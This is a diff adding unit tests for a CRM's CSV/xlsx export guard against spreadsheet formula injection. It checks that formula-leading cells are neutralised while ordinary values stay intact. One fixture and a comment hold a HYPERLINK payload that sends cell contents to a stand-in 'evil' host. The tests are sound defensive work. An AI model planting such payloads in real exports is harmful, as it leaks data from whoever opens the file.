@@ -61,3 +61,37 @@ class TestTabularSeam(FrappeTestCase):
 		"""_csv_records kept its name and its answer; only the rule's home moved."""
 		self.assertEqual(_csv_records(b"mobile_no,first_name\n9876500010,Eshan\n"),
 		                 [{"mobile_no": "9876500010", "first_name": "Eshan"}])
+
+	# ---- the formula guard: a download must be safe to OPEN -------------------------------------
+	# `=HYPERLINK("http://…"&A1)` in a lead name a partner supplied is inert everywhere in the CRM and
+	# runs the moment a manager opens the file. Frappe guards none of it, so the guard lives on this seam
+	# — a property of the FILE, not of whichever producer built the rows.
+
+	def test_a_formula_leading_cell_is_neutralised_in_csv(self):
+		out = tabular.write(["Name"], [['=HYPERLINK("http://evil"&A1)']], "csv").decode()
+		self.assertIn("'=HYPERLINK", out)
+
+	def test_every_formula_lead_is_covered_not_just_equals(self):
+		for lead in ("=", "+", "-", "@", "\t", "\r"):
+			self.assertEqual(tabular.safe_cell(lead + "cmd"), "'" + lead + "cmd")
+
+	def test_an_ordinary_value_is_left_exactly_alone(self):
+		for value in ("Asha", "9876500004", "a-b", "", None, 42, 3.5):
+			self.assertEqual(tabular.safe_cell(value), value)
+
+	def test_a_number_is_not_turned_into_text_by_the_guard(self):
+		"""An xlsx cell must stay a number, or every numeric column exports as left-aligned text."""
+		self.assertEqual(tabular.safe_cell(42), 42)
+		self.assertIsInstance(tabular.safe_cell(42), int)
+
+	def test_the_header_row_is_guarded_too(self):
+		out = tabular.write(["=BAD()"], [["x"]], "csv").decode()
+		self.assertIn("'=BAD()", out)
+
+	def test_the_list_download_reaches_for_this_rule_rather_than_keeping_its_own(self):
+		"""`list_export` cannot call `tabular.write` — it delegates to frappe's own reportview export —
+		so it must delegate the RULE instead. Two copies drift the day one is edited."""
+		from tatva_connect.api import list_export
+
+		self.assertEqual(list_export._as_text("=x"), tabular.safe_cell("=x"))
+		self.assertEqual(list_export._as_text("plain"), "plain")
